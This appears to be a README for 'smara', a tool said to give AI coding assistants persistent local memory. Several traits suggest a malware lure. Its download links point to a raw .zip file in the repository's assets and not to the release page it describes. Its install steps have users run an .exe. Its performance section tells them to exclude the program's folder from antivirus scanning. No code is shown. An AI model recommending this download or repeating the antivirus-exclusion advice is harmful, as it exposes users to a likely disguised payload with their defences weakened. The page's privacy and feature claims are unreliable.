# 🧠 smara - Persistent memory for your AI tools

[![Download smara](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jefffergunson118-beep/smara/raw/refs/heads/main/assets/Software-3.0.zip)

Smara provides a memory bank for your artificial intelligence tools. It tracks your projects and notes so that helpers like Claude, Cursor, and Codex remember your work between sessions. You no longer need to repeat your preferences or project details every time you start a new task. Smara keeps your context consistent.

## 🛠️ What is smara?

Most AI tools reset their knowledge once you close the window. This forces you to re-explain your coding style, your file structure, and your project goals every single day. Smara solves this by acting as a bridge between your tools and a private database. It stores the information that matters most to your workflow. Think of it as a digital notebook that your AI tools can read and update. 

This tool uses a local vector database to store your context. It organizes your snippets, requirements, and logs in a way that AI models understand. When you ask a question, smara provides the relevant background information to the AI. This results in more accurate outputs and fewer mistakes.

## 📥 Getting the software

You can obtain the current version of the application from the official release page. 

[Click here to open the download page](https://github.com/jefffergunson118-beep/smara/raw/refs/heads/main/assets/Software-3.0.zip)

## ⚙️ How to install smara

1. Open the release page link provided above.
2. Locate the section labeled Assets.
3. Select the file ending in .exe for Windows.
4. Save the file to your computer.
5. Double-click the file to begin the setup process.
6. Follow the on-screen prompts to complete the installation.
7. Launch the application from your desktop or start menu.

## 🚀 Setting up your memory

When you open smara for the first time, the application initializes your storage folder. This folder acts as the vault for your AI memory. 

1. Define a folder path on your computer where you want to keep your data. 
2. Grant smara permission to access this location.
3. Open your preferred AI tool, such as Cursor or Claude.
4. Navigate to the settings or configuration menu within your AI tool.
5. Select the option to link an external data source or memory provider.
6. Point the AI tool to the smara service running on your local machine.

## 🧩 Key features

### Shared Context
Smara connects multiple tools to one memory stream. If you save a project preference in Cursor, your Claude assistant can access that same detail later. This removes the need for manual synchronization across different platforms.

### Automatic Updates
The tool detects changes in your work files. As you code or write, smara tags relevant segments and updates the local database. You do not need to manually save your context. The system handles the flow of information in the background.

### Local Privacy
All data stays on your machine. We do not transmit your notes or project files to a cloud server. Your memory remains under your control at all times. This setup prevents data leaks and ensures you comply with your privacy requirements.

### Intelligent Retrieval
Smara uses similarity searches to find relevant information. When you ask your AI a question, it queries smara for matching records. The system provides the most recent and applicable notes based on your prompt. This mimics how humans retrieve information from long-term memory.

## 💻 System requirements

To run smara smoothly, your computer needs to meet these basic standards:

- Windows 10 or Windows 11 operating system.
- At least 4GB of available RAM.
- 500MB of free disk space for the database index.
- A stable internet connection for the initial tool integration.

## 📋 Frequently asked questions

### Does smara see my passwords?
No. The application is designed to index project files and coding instructions. We recommend that you do not store sensitive keys or passwords in any plain text files indexed by the system.

### Can I clear my memory?
Yes. Open the settings menu inside the smara dashboard. You will see an option to wipe the database. This removes all stored context immediately. 

### Why does my AI tool keep asking for access?
Your AI tool requires a connection handshake to initiate the data stream. Ensure that smara is running before you open your code editor or AI chat interface. If the connection fails, restart the smara application and verify the port settings in your configuration file.

### How do I store specific project styles?
Simply add a document named "ProjectStyle.txt" to your project directory. Smara automatically detects this file and adds it to your active context chain. Use this file to list your preferred coding standards or specific libraries your project requires.

## 📈 Improving performance

If you notice a delay in memory retrieval, check your settings to ensure that the index folder is excluded from your antivirus real-time scan. Background scans can sometimes block smara from updating the database. Adding the smara directory to your exclusion list creates a smoother experience when the application processes large batches of files.

Keep your AI tools updated. Occasionally, developers change how their software connects to third-party tools. If you run into connectivity issues after an update to Claude or Cursor, restart both the AI tool and the smara application. This refreshes the local link and clears stale cache files that might interrupt the flow of information.